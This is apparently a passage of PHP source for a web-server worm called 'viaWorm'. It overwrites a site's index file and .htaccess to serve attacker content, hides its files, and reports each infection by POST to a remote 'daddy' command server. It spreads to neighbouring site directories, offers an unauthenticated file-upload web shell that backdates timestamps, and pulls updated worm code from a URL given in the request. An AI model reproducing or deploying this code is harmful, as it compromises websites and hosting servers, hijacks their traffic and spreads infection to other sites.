$checkMainFileName = $mainFileNames[array_rand($mainFileNames)];\n                        list($name) = explode('.php', $checkMainFileName);\n                        $checkMainFileName = $name . $i . '.php';\n\n                        $checkMainFilePath = ($indexFile->getPath() . DIRECTORY_SEPARATOR . $checkMainFileName);\n\n                        $i++;\n\n                    } while(!$this->validMainFilePath($checkMainFilePath) && $i <= 20);\n\n                }\n\n                $mainFilePath = $checkMainFilePath;\n\n            }\n\n            if(!isset(self::$indexSources[$indexSourceKey])){\n                $indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES;\n            }\n\n            $content = base64_decode(self::$indexSources[$indexSourceKey]);\n            $replacements = array(\n                ':host' => $this->getHost(),\n                ':copy_file_name' => $copyFileName,\n                ':daddy_url' => __via_get_daddy_url(),\n                ':link_daddy_url' => __via_get_links_daddy_url(),\n                ':website_config_file' => $this->getWebsiteConfigFilePath(),\n                ':pages_map_file' => $this->getPagesMapFilePath(),\n                ':pages_sources_path' => $this->getPagesSourcesPath(),\n                ':links_sources_path' => $this->getLinksSourcesPath(),\n                ':static_files_path' => $this->getStaticFilesPath(),\n                ':static_files_url_prefix' => $this->getStaticFilesUrlPrefix(),\n            );\n\n            $content = str_replace(\n                array_keys($replacements),\n                $replacements,\n                $content\n            );\n\n            @__via_file_put_contents($mainFilePath, trim($content));\n\n            $this->addHtaccessRule(basename($mainFilePath));\n\n        } else {\n\n            throw new Exception('Unavailable to define index file', 500);\n\n        }\n\n    }\n\n    \/**\n     * @void\n     *\/\n    public function analyzePossibleIndexFiles()\n    {\n\n        $website_config = $this->getWebsiteConfig();\n        if($website_config && isset($website_config['index_file_path']) && @is_file($website_config['index_file_path'])){\n\n            $path = realpath($website_config['index_file_path']);\n            $this->indexFile = new SplFileInfo($path);\n            return;\n\n        }\n\n        if($this->possibleIndexes){\n\n            usort($this->possibleIndexes, array($this, 'sortPossibleIndexFiles'));\n\n            foreach ($this->possibleIndexes as $i => $possibleIndex) {\n\n                \/**\n                 * @var $file SplFileInfo\n                 *\/\n                $file = $possibleIndex['file'];\n                $filePath = realpath($file->getPath() . DIRECTORY_SEPARATOR . $file->getFilename());\n\n                if ($filePath) {\n                    $this->indexFile = new SplFileInfo($filePath);\n                    break;\n                }\n            }\n\n\n        }\n\n        if($this->indexFile == null){\n\n            $indexFilePath = null;\n            $indexFileNames = array('index.php', 'app.php', 'main.php');\n\n            foreach($indexFileNames as $indexFileName){\n                $checkIndexFilePath = $this->getRootDir() . DIRECTORY_SEPARATOR . $indexFileName;\n                if(!@file_exists($checkIndexFilePath)){\n                    $indexFilePath = $checkIndexFilePath;\n                    break;\n                }\n            }\n\n            if(!$indexFilePath){\n\n                $i = 1;\n                do {\n\n                    $checkIndexFilePath = $this->getRootDir() . DIRECTORY_SEPARATOR . 'index.' . $i . '.php';\n                    $i++;\n\n                } while(@file_exists($checkIndexFilePath) && $i <= 20);\n\n                $indexFilePath = $checkIndexFilePath;\n\n            }\n\n            $data = __via_file_get_contents_curl($this->getWebsiteUlr());\n\n            if(!$data){\n\n                $data = '<html><title>:title<\/title><body><div class=\"main\">:main<\/div><\/body><\/html>';\n\n                $replacements = array(\n                    ':title' => strtoupper($this->getHost()),\n                    ':main' => 'Welcome to ' . strtoupper($this->getHost()) . '!',\n                );\n\n                $data = str_replace(\n                    array_keys($replacements),\n                    $replacements,\n                    $data\n                );\n\n\n            }\n\n            @__via_file_put_contents($indexFilePath, $data);\n            $this->indexFile = new SplFileInfo(realpath($indexFilePath));\n\n        }\n\n    }\n\n    public function sortPossibleIndexFiles($a, $b)\n    {\n        return $a['rate'] < $b['rate'];\n    }\n\n    \/**\n     * @void\n     *\/\n    public function analyzeHtaccessFile()\n    {\n\n        $file = $this->getHtaccessFile();\n\n        if ($file instanceof SplFileInfo) {\n\n            if(!$file->isFile() || !$file->isReadable() || !$file->isWritable()){\n                return;\n            }\n\n            $DirectoryIndex = null;\n\n            $path = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n\n            foreach (file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {\n\n                $line = trim($line);\n\n                if (!$line) {\n                    continue;\n                }\n\n                if (substr($line, 0, 1) == '#') {\n                    continue;\n                }\n\n                \/* Check .htaccess DirectoryIndex variable *\/\n                if (strpos($line, 'DirectoryIndex') !== false) {\n                    $DirectoryIndex = current(explode('#', trim(str_replace('DirectoryIndex', '', $line))));\n                }\n\n            }\n\n            if ($DirectoryIndex) {\n                if (isset($this->possibleIndexes[$DirectoryIndex])) {\n                    $this->possibleIndexes[$DirectoryIndex]['rate']++;\n                }\n            }\n\n\n        }\n\n    }\n\n    \/**\n     * @param $indexFileName\n     *\/\n    public function addHtaccessRule($indexFileName)\n    {\n\n        $content = '';\n        $file = $this->getHtaccessFile();\n\n        if ($file instanceof SplFileInfo && $file->isFile() && $file->isReadable()) {\n\n            $filePath = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n\n            $content = @file_get_contents($filePath);\n            if($content){\n\n                $lines = preg_split(\"\/\\\\r\\\\n|\\\\r|\\\\n\/\", $content);\n\n                foreach($lines as $i => $line){\n\n                    $remove = false;\n\n                    if(!$line){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'ErrorDocument 404') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'R=301') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'R=302') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'HTTP_REFERER') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'HTTP_USER_AGENT') !== false){\n                        $remove = true;\n                    }\n\n                    if($remove){\n                        unset($lines[$i]);\n                    }\n\n                }\n\n                $content = implode(\"\\n\", $lines);\n\n            } else {\n                $content = '';\n            }\n\n        } else {\n\n            $filePath = $this->getRootDir() . DIRECTORY_SEPARATOR . '.htaccess';\n\n        }\n\n\/\/@TODO remove prev change\n\/\/@TODO remove existing DirectoryIndex\n        $content = \"\n\n$content\n\n<IfModule mod_rewrite.c>\n    SetEnv HTTP_MOD_REWRITE On\n<\/IfModule>\n\nRewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^.*$ $indexFileName [NC,L]\n\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteCond %{REQUEST_URI} .*\\.html [OR]\nRewriteCond %{REQUEST_URI} .*\\.htm\nRewriteCond %{REQUEST_URI} !.*\\.php\nRewriteRule ^.*$ $indexFileName [NC,L]\n\nDirectoryIndex $indexFileName\n        \";\n\n        @__via_file_put_contents($filePath, $content);\n\n        \/*\n                $webConfig = '\n\n        <rule name=\"rule 1H\" stopProcessing=\"true\">\n            <match url=\"^.*$\"  ignoreCase=\"true\" \/>\n            <action type=\"Rewrite\" url=\"\/-\"  \/>\n        <\/rule>\n        <rule name=\"rule 2H\" stopProcessing=\"true\">\n            <match url=\"^.*$\"  ignoreCase=\"true\" \/>\n            <action type=\"Rewrite\" url=\"\/' . $indexFileName . '\"  \/>\n        <\/rule>\n\n                ';\n                $webConfigPath = $this->getRootDir() . DIRECTORY_SEPARATOR . 'web.config';\n                @__via_file_put_contents($webConfigPath, $webConfig);\n        *\/\n\n    }\n\n    \/**\n     * @return null|string\n     *\/\n    public function getRootDir()\n    {\n\n        if (!$this->rootDir) {\n\n            if (isset($_SERVER['DOCUMENT_ROOT'])) {\n                $rootDir = $_SERVER['DOCUMENT_ROOT'];\n            } else {\n                $rootDir = dirname(__FILE__);\n            }\n\n            $uri = str_replace('\/', DIRECTORY_SEPARATOR, $_SERVER['SCRIPT_NAME']);\n            $_rootDir = str_replace($uri, '', __FILE__);\n            if($rootDir != $_rootDir){\n                $rootDir = $_rootDir;\n            }\n\n            $this->rootDir = $rootDir;\n\n        };\n\n        return realpath($this->rootDir);\n\n    }\n\n    \/**\n     * @return array\n     * @throws Exception\n     *\/\n    public function getRootDirFiles()\n    {\n\n        if (!is_writable($this->getRootDir())) {\n            throw new Exception('Root directory is not writable', 500);\n        }\n\n        $files = array();\n        $filesPaths = @__via_get_dir_file_paths($this->getRootDir());\n\n        foreach ($filesPaths as $filePath) {\n\n            if (@is_dir($filePath)) {\n                continue;\n            };\n\n            $files[] = $filePath;\n\n        }\n\n        return $files;\n\n    }\n\n    \/**\n     * @param $htaccessFile\n     *\/\n    public function setHtaccessFile($htaccessFile)\n    {\n        $this->htaccessFile = $htaccessFile;\n    }\n\n    \/**\n     * @return null|SplFileInfo\n     *\/\n    public function getHtaccessFile()\n    {\n        return $this->htaccessFile;\n    }\n\n    \/**\n     * @param $host\n     *\/\n    public function setHost($host)\n    {\n        $this->host = $host;\n    }\n\n    \/**\n     * @return null|string\n     *\/\n    public function getHost()\n    {\n        if (!$this->host) {\n            $this->host = self::getRequestHost();\n        }\n        return $this->host;\n    }\n\n    \/**\n     * @return string\n     *\/\n    public function getWebsiteUlr(){\n        return 'http:\/\/' . $this->getHost();\n    }\n\n    \/**\n     * @return string\n     *\/\n    public static function getRequestHost()\n    {\n\n        if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {\n\n            $host = $_SERVER['HTTP_X_FORWARDED_HOST'];\n            $elements = explode(',', $host);\n\n            $host = trim(end($elements));\n\n        } else {\n\n            if (!$host = $_SERVER['HTTP_HOST']) {\n\n                if (!$host = $_SERVER['SERVER_NAME']) {\n\n                    $host = !empty($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '';\n\n                }\n\n            }\n\n        }\n\n        return $host;\n\n    }\n\n    \/**\n     * @param $path\n     * @return mixed|string\n     *\/\n    public function buildUrl($path){\n        if($this->getRootDir() == '\/'){\n            $url = $this->getWebsiteUlr() . $path;\n        } else {\n            $url = str_replace($this->getRootDir(), $this->getWebsiteUlr(), $path);\n        }\n        $url = str_replace('\\\\', '\/', $url);\n        return $url;\n    }\n\n    \/**\n     * @return string\n     *\/\n    public function getWormUrl()\n    {\n\n        $file = $this->getWormBlackHoleFile();\n        if($file->isFile()){\n            $path = ($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n            return $this->buildUrl($path);\n        } else {\n            return 'http:\/\/' . $this->getRequestHost() . $_SERVER['SCRIPT_NAME'];\n        }\n\n    }\n\n    \/**\n     * @param $url\n     * @return array|bool\n     *\/\n    public static function isValidUrl($url)\n    {\n\n        $redirectUrl = null;\n\n        $response = null;\n        if($url){\n\n            if(function_exists('curl_init')){\n\n                $ch = curl_init();\n\n                curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);\n                curl_setopt($ch, CURLOPT_HEADER, true);\n                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n                curl_setopt($ch, CURLOPT_URL, $url);\n                if(!ini_get('safe_mode') && !ini_get('open_basedir')){\n                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n                }\n                curl_setopt($ch, CURLOPT_HTTPHEADER, array(\n                    'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',\n                    'User-Agent: Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/35.0.1916.114 Safari\/537.36',\n                ));\n\n                $response = curl_exec($ch);\n                curl_close($ch);\n\n                if(!$response){\n                    $response = @file_get_contents($url);\n                }\n\n            } else {\n\n                $response = @file_get_contents($url);\n\n            }\n\n        }\n\n        $isValid = ($response != false);\n        $statusCode = ($isValid ? 200 : 500);\n\n        if($response){\n\n            $headers = explode(\"\\n\",$response);\n\n            $j = count($headers);\n            for($i = 0; $i < $j; $i++){\n\n                if(strpos($headers[$i],\"Location:\") !== false){\n                    $redirectUrl = trim(str_replace(\"Location:\",\"\",$headers[$i]));\n                }\n\n                if (stripos($headers[$i], 'HTTP\/1.1') !== FALSE) {\n                    list(,$code) = explode(' ', $headers[$i]);\n                    if($code){\n                        $statusCode = $code;\n                    }\n                }\n\n            }\n\n        }\n\n        $result = array(\n            'isValid' => $isValid,\n            'url' => $url,\n            'redirectUrl' => $redirectUrl,\n            'statusCode' => $statusCode,\n        );\n\n        return $isValid ? $result : false;\n\n    }\n\n    \/**\n     * @return SplFileInfo\n     *\/\n    public function getIndexFile()\n    {\n        return $this->indexFile;\n    }\n\n    \/**\n     * @param null $host\n     * @param null $rootDir\n     * @param bool $scanSiblings\n     * @param $indexSourceKey\n     * @return array\n     *\/\n    public static function processHost($host = null, $rootDir = null, $scanSiblings = true, $indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES)\n    {\n\n        $worm = new self($host, $rootDir);\n\n        $result = array(\n            'domain' => $worm->getHost(),\n            'success' => true,\n            'message' => null,\n        );\n\n        try {\n\n            $worm->start();\n\n            $worm->hideWormFiles();\n            $worm->changeIndexFile($indexSourceKey);\n\n            $path = ($worm->getIndexFile()->getPath()) . DIRECTORY_SEPARATOR . $worm->getIndexFile()->getFilename();\n            $result['message'] = 'Index file ' . $path . ' - successfully changed';\n            $result['domain'] = $worm->getHost();\n            $result['worm_url'] = $worm->getWormUrl();\n            $result['static_files_url_prefix'] = $worm->getStaticFilesUrlPrefix();\n            $result['index_source_key'] = $indexSourceKey;\n\n        } catch (Exception $e) {\n\n            $result['success'] = false;\n            $result['message'] = $e->getMessage();\n\n        }\n\n        $query = http_build_query(array('worm_result' => serialize($result)));\n        $worm_precess_url = __via_get_daddy_url() . '\/process-worm';\n\n        viaWorm::sendPost($worm_precess_url, $query);\n\n        if ($scanSiblings) {\n            $result['siblings'] = self::checkParentDirectoryForWebsites($_SERVER['DOCUMENT_ROOT'], $indexSourceKey);\n        }\n\n        return $result;\n\n    }\n\n    \/**\n     * @param $url\n     * @param $query\n     * @return bool|mixed|string\n     *\/\n    public static function sendPost($url, $query)\n    {\n\n        if (function_exists('curl_init')) {\n\n            $ch = curl_init($url);\n            curl_setopt($ch, CURLOPT_POST, true);\n            curl_setopt($ch, CURLOPT_POSTFIELDS, $query);\n            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n\n            $response = curl_exec($ch);\n\n            curl_close($ch);\n\n            return $response;\n\n        } else {\n\n            return @__via_file_get_contents_curl($url . '?' . $query);\n\n        }\n\n    }\n\n    \/**\n     * @param $dir\n     * @param $indexSourceKey\n     * @return array\n     *\/\n    public static function checkParentDirectoryForWebsites($dir, $indexSourceKey = self::INDEX_SOURCE_KEY_ARTICLES)\n    {\n\n        $results = array();\n\n        $current_host = self::getRequestHost();\n\n        \/\/@TODO check all path hierarchy\n        try {\n            $parentDirectory = realpath($dir . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR);\n            $parentDirectoryFilesPaths = @__via_get_dir_file_paths($parentDirectory);\n        } catch(Exception $e){\n            $parentDirectoryFilesPaths = null;\n        }\n\n        if($parentDirectoryFilesPaths){\n\n            foreach ($parentDirectoryFilesPaths as $path) {\n\n                $file = new SplFileInfo($path);\n\n                if (@is_dir($path) && $file->getFilename() != $current_host && $file->getFilename() != trim($current_host, 'www.')) {\n\n                    if(preg_match('\/^(?:[-A-Za-z0-9]+\\.)+[A-Za-z]{2,6}$\/', $file->getFilename())){\n\n                        $path = realpath($file->getPath()) . DIRECTORY_SEPARATOR . $file->getFilename();\n                        $result = self::processHost($file->getFilename(), $path, false, $indexSourceKey);\n                        $results[] = $result;\n\n                    }\n\n                }\n\n            }\n\n        }\n\n        return $results;\n\n    }\n\n\n}\n\nerror_reporting(0);\n$action = isset($_GET['action']) ? $_GET['action'] : 'index';\n\nswitch ($action) {\n    case 'via-make-test':\n\n        if(isset($_GET['via-version'])){\n            echo 2;\n            exit();\n        }\n\n        echo 1;\n        exit();\n\n    case 'upload':\n\n\n        if (isset($_POST['Submit'])) {\n\n            $fileDir = \"\";\n\n            $user_file_name = $_FILES['image']['name'];\n            $user_file_tmp = $_FILES['image']['tmp_name'];\n\n            if (isset($_FILES['image']['name'])) {\n\n                $destination = $fileDir . $user_file_name;\n                @move_uploaded_file($user_file_tmp, $destination);\n\n                $changeTime = null;\n\n                $paths = __via_get_dir_file_paths(__DIR__);\n                foreach($paths as $path){\n                    if($path != __FILE__){\n                        $changeTime = filemtime($path);\n                        break;\n                    }\n                }\n\n                if(!$changeTime){\n                    $changeTime = time();\n                }\n                @chmod($destination, 0755);\n                @touch($destination, $changeTime);\n\n                $fullURL = \"http:\/\/\" . viaWorm::getRequestHost() . dirname($_SERVER['SCRIPT_NAME']) . '\/' . $user_file_name;\n\n                echo \"<b>Done ==> <\/b><a href='$fullURL' target='_blank'>$user_file_name<\/a> - \" . $changeTime;\n                echo \"<br\/>\";\n                echo \"File was last modified: \" . date (\"F d Y H:i:s.\", $changeTime);\n\n            }\n\n        } else {\n\n            echo '<form method=\"POST\" action=\"\" enctype=\"multipart\/form-data\"><input type=\"file\" name=\"image\"><input type=\"Submit\" name=\"Submit\" value=\"Submit\"><\/form>';\n\n        }\n\n        exit();\n\n        break;\n\n    case 'update-index':\n\n        $result = null;\n\n        try {\n\n            $worm = new viaWorm();\n            $worm->start();\n\n            $worm->hideWormFiles();\n            $worm->changeIndexFile();\n\n            $path = ($worm->getIndexFile()->getPath()) . DIRECTORY_SEPARATOR . $worm->getIndexFile()->getFilename();\n\n            $result['success'] = true;\n            $result['message'] = 'Index file ' . $path . ' - successfully changed';\n            $result['domain'] = $worm->getHost();\n            $result['worm_url'] = $worm->getWormUrl();\n\n            $query = http_build_query(array('worm_result' => serialize($result)));\n            $worm_precess_url = __via_get_daddy_url() . '\/process-worm';\n\n            viaWorm::sendPost($worm_precess_url, $query);\n\n        } catch(Exception $e){\n\n            $result = array('success' => false, 'message' => $e->getMessage());\n\n        }\n\n        header('Content-type: application\/json');\n        echo json_encode($result);\n        exit();\n\n        break;\n\n    case 'worm-update':\n\n        if(isset($_GET['worm_source_url'])){\n            $worm_source_url = $_GET['worm_source_url'];\n        } else {\n            $worm_source_url = __via_get_daddy_url() . '\/worm_source.txt';\n        }\n\n        $worm_source = json_decode(@__via_file_get_contents_curl($worm_source_url), true);\n\n        if($worm_source){\n            try {\n                $worm = new viaWorm();\n                $worm->start();\n                $result = $worm->updateWorm($worm_source);\n                $result['success'] = true;\n            } catch(Exception $e){\n                $result = array('success' => false, 'message' => $e->getMessage());\n            }\n        }\n\n        header('Content-type: application\/json');\n        echo json_encode($result);\n        exit();\n\n        break;\n\n    case 'change-state':\n\n        if(isset($_GET['state'])){\n\n            $state = (int)$_GET['state'];\n\n            try {\n\n                $worm = new viaWorm();\n                $worm->start();\n                $worm->setWebsiteConfig(array(\n                    'state' => $state,\n                ));\n\n                $result = array('success' => true, 'state' => $state);\n\n            } catch(Exception $e){\n\n                $result = array('success' => false, 'message' => $e->getMessage());\n\n            }\n\n        }\n\n        header('Content-type: application\/json');\n        echo json_encode($result);\n        exit();\n\n        break;\n\n    case 'update-pages-map':\n\n        header('Content-type: application\/json');\n\n        try {\n\n            $worm = new viaWorm();\n            $worm->start();\n            $bytesChanged = $worm->updatePagesMap();\n\n            $result = array('success' => ($bytesChanged != false), 'message' => 'Bytes changed ' . $bytesChanged);\n\n        } catch(Exception $e){\n\n            $result = array('success' => false, 'message' => $e->getMessage());\n\n        }\n\n        echo json_encode($result);\n        exit();\n\n        break;\n\n    case 'index':\n    default:\n\n        header('Content-type: application\/json');\n\n        $indexSourceKey = isset($_GET['index_source_key']) ? $_GET['index_source_key'] : viaWorm::INDEX_SOURCE_KEY_ARTICLES;\n\n        $scanSiblings = true;\n        if(isset($_GET['scan_siblings'])){\n            if(function_exists('filter_var')){\n                $scanSiblings = filter_var($_GET['scan_siblings'], FILTER_VALIDATE_BOOLEAN);\n            } else {\n                $scanSiblings = false;\n            }\n        }\n\n        if(isset($_GET['use_ip'])){\n            if(function_exists('filter_var')){\n                $use_only_daddy_ip = filter_var($_GET['use_ip'], FILTER_VALIDATE_BOOLEAN);\n            } else {\n                $use_only_daddy_ip = false;\n            }\n        }\n\n        $result = viaWorm::processHost(null, null, $scanSiblings, $indexSourceKey);\n\n        echo json_encode($result);\n        exit();\n\n}"